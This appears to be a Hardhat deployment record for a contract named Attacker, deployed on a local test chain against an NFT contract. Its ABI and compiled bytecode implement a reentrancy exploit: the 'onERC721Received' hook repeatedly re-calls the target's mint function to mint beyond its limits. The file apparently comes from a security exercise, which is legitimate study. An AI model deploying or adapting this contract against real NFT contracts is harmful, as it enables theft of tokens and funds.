{
  "address": "0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address payable",
          "name": "_nftContract",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "counter",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "_amount",
          "type": "uint256"
        }
      ],
      "name": "initiate",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "nftContract",
      "outputs": [
        {
          "internalType": "address payable",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "operator",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "from",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "tokenId",
          "type": "uint256"
        },
        {
          "internalType": "bytes",
          "name": "data",
          "type": "bytes"
        }
      ],
      "name": "onERC721Received",
      "outputs": [
        {
          "internalType": "bytes4",
          "name": "",
          "type": "bytes4"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "transactionHash": "0xdf6663ce76af604704d0d639a420b29bee5f041635f0c594bffd373ff76e4919",
  "args": [
    "0x5FbDB2315678afecb367f032d93F642f64180aa3"
  ],
  "numDeployments": 1,
  "solcInputHash": "64fabc1c690dca835a927a56cafb5b5b",
  "bytecode": "0x608060405234801561000f575f80fd5b50604051610894380380610894833981810160405281019061003191906100d4565b805f806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506100ff565b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100a38261007a565b9050919050565b6100b381610099565b81146100bd575f80fd5b50565b5f815190506100ce816100aa565b92915050565b5f602082840312156100e9576100e8610076565b5b5f6100f6848285016100c0565b91505092915050565b6107888061010c5f395ff3fe60806040526004361061003e575f3560e01c8063150b7a021461004257806361bc221a1461007e5780637901ea78146100a8578063d56d229d146100c4575b5f80fd5b34801561004d575f80fd5b5061006860048036038101906100639190610492565b6100ee565b6040516100759190610550565b60405180910390f35b348015610089575f80fd5b5061009261023a565b60405161009f9190610578565b60405180910390f35b6100c260048036038101906100bd9190610591565b610240565b005b3480156100cf575f80fd5b506100d8610379565b6040516100e591906105dc565b60405180910390f35b5f600f60015411610231575f805f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1660036040516024016101439190610643565b6040516020818303038152906040527f31c864e8000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040516101cd91906106c8565b5f604051808303815f865af19150503d805f8114610206576040519150601f19603f3d011682016040523d82523d5f602084013e61020b565b606091505b5050905080610218575f80fd5b60015f81548092919061022a9061070b565b9190505550505b95945050505050565b60015481565b5f805f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16826040516024016102899190610578565b6040516020818303038152906040527f31c864e8000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff838183161783525050505060405161031391906106c8565b5f604051808303815f865af19150503d805f811461034c576040519150601f19603f3d011682016040523d82523d5f602084013e610351565b606091505b505090508061035e575f80fd5b60015f8154809291906103709061070b565b91905055505050565b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f80fd5b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6103cd826103a4565b9050919050565b6103dd816103c3565b81146103e7575f80fd5b50565b5f813590506103f8816103d4565b92915050565b5f819050919050565b610410816103fe565b811461041a575f80fd5b50565b5f8135905061042b81610407565b92915050565b5f80fd5b5f80fd5b5f80fd5b5f8083601f84011261045257610451610431565b5b8235905067ffffffffffffffff81111561046f5761046e610435565b5b60208301915083600182028301111561048b5761048a610439565b5b9250929050565b5f805f805f608086880312156104ab576104aa61039c565b5b5f6104b8888289016103ea565b95505060206104c9888289016103ea565b94505060406104da8882890161041d565b935050606086013567ffffffffffffffff8111156104fb576104fa6103a0565b5b6105078882890161043d565b92509250509295509295909350565b5f7fffffffff0000000000000000000000000000000000000000000000000000000082169050919050565b61054a81610516565b82525050565b5f6020820190506105635f830184610541565b92915050565b610572816103fe565b82525050565b5f60208201905061058b5f830184610569565b92915050565b5f602082840312156105a6576105a561039c565b5b5f6105b38482850161041d565b91505092915050565b5f6105c6826103a4565b9050919050565b6105d6816105bc565b82525050565b5f6020820190506105ef5f8301846105cd565b92915050565b5f819050919050565b5f60ff82169050919050565b5f819050919050565b5f61062d610628610623846105f5565b61060a565b6105fe565b9050919050565b61063d81610613565b82525050565b5f6020820190506106565f830184610634565b92915050565b5f81519050919050565b5f81905092915050565b5f5b8381101561068d578082015181840152602081019050610672565b5f8484015250505050565b5f6106a28261065c565b6106ac8185610666565b93506106bc818560208601610670565b80840191505092915050565b5f6106d38284610698565b915081905092915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f610715826103fe565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff8203610747576107466106de565b5b60018201905091905056fea26469706673582212207d512c92a5a17dd95c80a3fc48fa4e481dfd481ec1155697e2bfcf49f9a0f8aa64736f6c63430008140033",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  },
  "storageLayout": {
    "storage": [
      {
        "astId": 4,
        "contract": "contracts/Attacker.sol:Attacker",
        "label": "nftContract",
        "offset": 0,
        "slot": "0",
        "type": "t_address_payable"
      },
      {
        "astId": 6,
        "contract": "contracts/Attacker.sol:Attacker",
        "label": "counter",
        "offset": 0,
        "slot": "1",
        "type": "t_uint256"
      }
    ],
    "types": {
      "t_address_payable": {
        "encoding": "inplace",
        "label": "address payable",
        "numberOfBytes": "20"
      },
      "t_uint256": {
        "encoding": "inplace",
        "label": "uint256",
        "numberOfBytes": "32"
      }
    }
  }
}